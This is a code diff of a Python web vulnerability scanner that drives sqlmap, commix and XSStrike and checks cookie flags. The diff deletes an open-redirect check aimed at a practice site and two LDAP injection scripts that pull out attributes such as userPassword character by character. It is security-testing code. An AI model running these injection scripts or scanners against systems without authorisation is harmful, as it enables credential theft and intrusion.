@@ -247,7 +247,6 @@ def scan_OS_cmd(req, number_param):
     file1 = open('./src/request.txt', 'w')
     file1.writelines(sample_string)
     
-    # Closing file
     file1.close()
 
     commix_command = "python3 ./tool/commix/commix.py -r ./src/request.txt --batch"
@@ -290,16 +289,13 @@ def scan_SQLi(req):
     file_request = r"./src/request.txt"
     # Construct the command as a list
     command = ["python3", sqlmap_path, "-r", f"{file_request}", "--answers='follow=Y'", "--batch"]
-    # tamper,level,risk
 
-    # Execute the command and capture the output
     result = subprocess.run(command, capture_output=True, text=True)
 
 
     # Check if the command was successful
     if result.returncode == 0:
         print("Command executed successfully.")
-        # Write the output to a file
         with open(sqlmap_output, 'w') as output_file:
             output_file.write(result.stdout)
     else:
@@ -307,13 +303,10 @@ def scan_SQLi(req):
 
     # analysis file result
     with open(sqlmap_output, 'r') as file:
-        # Đọc từng dòng của tệp
         for line in file:
-        # Sử dụng biểu thức chính quy để kiểm tra xem dòng có chứa pattern mong muốn không
             match1 = re.search(r"parameter '(\w+)' is vulnerable", line)
             match2 = re.search(r"sqlmap resumed the following injection point\(s\) from stored session:", line)
             if match1:
-                # Nếu có, in thông báo và đặt flag để in ra màn hình
                 parameter_id = match1.group(1)
                 print(f"Found vulnerable parameter: {parameter_id}")
                 flag = True
@@ -322,18 +315,15 @@ def scan_SQLi(req):
                 flag = True
     if flag:
         with open(sqlmap_output, 'r') as file:
-        # Đọc từng dòng của tệp
             start_writing = False
             with open(r'src/temp_database.txt', 'w') as output:
                 for line in file:
-                    # Kích hoạt cờ khi gặp dòng '---'
                     if line.strip() == '---':
                         if start_writing:
-                            break  # Dừng ghi nếu đã kết thúc nội dung cần ghi
+                            break
                         start_writing = not start_writing
                         continue
 
-                    # Nếu cờ được kích hoạt, ghi vào file output
                     if start_writing:
                         output.write(line)
     else:
@@ -345,7 +335,6 @@ def scan_SQLi(req):
         return content
 
 def write_file(req):
-    # base64_bytes = req.encode("utf-8") 
   
     sample_string_bytes = base64.b64decode(req) 
     sample_string = sample_string_bytes.decode('utf-8')
@@ -353,7 +342,6 @@ def write_file(req):
     file1 = open('./src/request.txt', 'w')
     file1.writelines(sample_string)
     
-    # Closing file
     file1.close()
 
 def write_file_respon(respon):
@@ -364,7 +352,6 @@ def write_file_respon(respon):
     file1 = open('./src/response.txt', 'w')
     file1.writelines(sample_string)
     
-    # Closing file
     file1.close()
 
 def scan_CORS(req, url):
@@ -393,10 +380,8 @@ def find_comments(response_text):
         response = file_read.read()
 
     
-    # Biểu thức chính quy để tìm đoạn comment trong response
     comment_pattern = re.compile(r'<!--(.*?)-->', re.DOTALL)
 
-    # Tìm tất cả các đoạn comment trong response
     comment_matches = re.findall(comment_pattern, response)
 
     if (len(comment_matches) > 0):
@@ -419,10 +404,8 @@ def find_javascript_code(response_text):
     with open("./src/response.txt", 'r') as file_read:
         response = file_read.read()
 
-    # Biểu thức chính quy để tìm đoạn mã JavaScript trong response
     javascript_pattern = re.compile(r'<script\b[^>]*>(.*?)<\/script>', re.DOTALL | re.IGNORECASE)
 
-    # Tìm tất cả các đoạn mã JavaScript trong response
     javascript_matches = re.findall(javascript_pattern, response)
 
     for javascript_code in javascript_matches:
@@ -491,44 +474,6 @@ def scan_SSTI(method, params, url):
         with open(r'src/temp_database.txt', 'r') as output:
             content = output.read()
             return content
-        
-            
-
-def scan_open_redirect(url):
-
-    url = "https://bwapp.hakhub.net/unvalidated_redir_fwd_1.php?url="
-    # Run OS command oralyzer
-    # python oralyzer.py -l test.txt (command)
-    open_redirect_path = "./tool/Oralyzer/oralyzer.py"
-    open_redirect_output = "./tool/Oralyzer/output.txt"
-
-    # Construct the command as a list
-    command = ["python3", open_redirect_path, "-l", url]
-    # tamper,level,risk
-
-    # Execute the command and capture the output
-    result = subprocess.run(command, capture_output=True, text=True)
-
-    # Check if the command was successful
-    if result.returncode == 0:
-        print("Command executed successfully.")
-        # Write the output to a file
-        with open(open_redirect_output, 'w') as output_file:
-            output_file.write(result.stdout)
-    else:
-        print(f"Error: {result.stderr}")
-
-    # analysis file result
-    start_writing = False
-    with open(open_redirect_output, 'r') as file:
-        # Đọc từng dòng của tệp
-        for line in file:
-        # Sử dụng biểu thức chính quy để kiểm tra xem dòng có chứa pattern mong muốn không
-            if "Header Based Redirection" in line:
-                # Nếu có thì in ra màn hình
-                print("\033[91mFound vulnerable\033[0m")
-                print(line.strip())
-                break
 
 def check_http_method(url):
     try:
@@ -574,54 +519,6 @@ def decode_base64(string):
     sample_string_bytes = base64.b64decode(base64_bytes) 
     sample_string = sample_string_bytes.decode("utf-8")
     return sample_string
-
-def scan_LDAP_fields(url):
-    #!/usr/bin/python3
-    import requests
-    import string
-    from time import sleep
-    import sys
-
-    proxy = { "http": "localhost:8080" }
-    alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
-
-    attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]
-
-    result = ''
-    for attribute in attributes: #Extract all attributes
-        value = ""
-        finish = False
-        while not finish:
-            for char in alphabet: #In each possition test each possible printable char
-                query = f"*)({attribute}={value}{char}*"
-                data = {'login':query, 'password':'pass'}
-                r = requests.post(url, data=data, proxies=proxy)
-                sys.stdout.write(f"\r{attribute}: {value}{char}")
-                #sleep(0.5) #Avoid brute-force bans
-                if "Cannot login" in r.text:
-                    value += str(char)
-                    break
-
-                if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
-                    finish = True
-                    print() 
-
-def scan_LDAP_Blind(url):
-    #!/usr/bin/python3
-
-    import requests, string
-    alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
-
-    flag = ""
-    for i in range(50):
-        print("[i] Looking for number " + str(i))
-        for char in alphabet:
-            r = requests.get(url + flag + char)
-            if ("TRUE CONDITION" in r.text):
-                flag += char
-                print("[+] Flag: " + flag)
-                break
-    return "[+] Flag: " + flag
 
 def scan_XSS(url, number_param):
     xsstrike_command = f"python3 ./tool/XSStrike/xsstrike.py -u '{url}'"
@@ -702,20 +599,17 @@ def scan_JWT_Token(req):
     
 def has_same_site_attribute(respon):
     write_file_respon(respon)
-    file_path = './src/response.txt'  # Thay thế bằng đường dẫn thực tế của bạn
+    file_path = './src/response.txt'
     with open(file_path, "r") as file:
         request_content = file.read()
 
-    # Tìm và kiểm tra thông tin về Cookie trong yêu cầu
     for line in request_content:
         if line.startswith("Cookie:"):
             cookie_header = line.strip()
 
-            # Kiểm tra xem có thuộc tính SameSite không
+            # Check SameSite in cookie attribute
             if 'SameSite' in cookie_header:
-                # samesite_attribute = cookie_header.split(';')[1].strip()
                 
-                # Kiểm tra giá trị của thuộc tính SameSite
                 if 'SameSite=None' in cookie_header:
                     print("SameSite attribute is present and set to None.")
                     return "SameSite attribute is present and set to None."
@@ -734,14 +628,13 @@ def has_httponly_attribute(respon):
     with open("./src/response.txt", 'r') as file_read:
         cookie_header = file_read.read()
 
-    # Chia header cookie thành các cặp key-value
     cookie_attributes = [attribute.strip().split('=') for attribute in cookie_header.split(';')]
     
     if len(cookie_attributes) < 1:
         print("This site don't use cookie.")
         return "This site don't use cookie."
 
-    # Tìm kiếm thuộc tính httponly trong danh sách các cặp key-value
+    # Check httponly in cookie attribute
     httponly_attribute = next((attr for attr in cookie_attributes if attr[0].lower() == 'httponly'), None)
 
     if httponly_attribute:
@@ -757,14 +650,13 @@ def has_secure_attribute(respon):
     with open("./src/response.txt", 'r') as file_read:
         cookie_header = file_read.read()
 
-    # Chia header cookie thành các cặp key-value
     cookie_attributes = [attribute.strip().split('=') for attribute in cookie_header.split(';')]
 
     if len(cookie_attributes) < 1:
         print("This site don't use cookie.")
         return "This site don't use cookie."
 
-    # Tìm kiếm thuộc tính secure trong danh sách các cặp key-value
+    # Check secure in cookie attribute
     secure_attribute = next((attr for attr in cookie_attributes if attr[0].lower() == 'secure'), None)
 
     if secure_attribute:
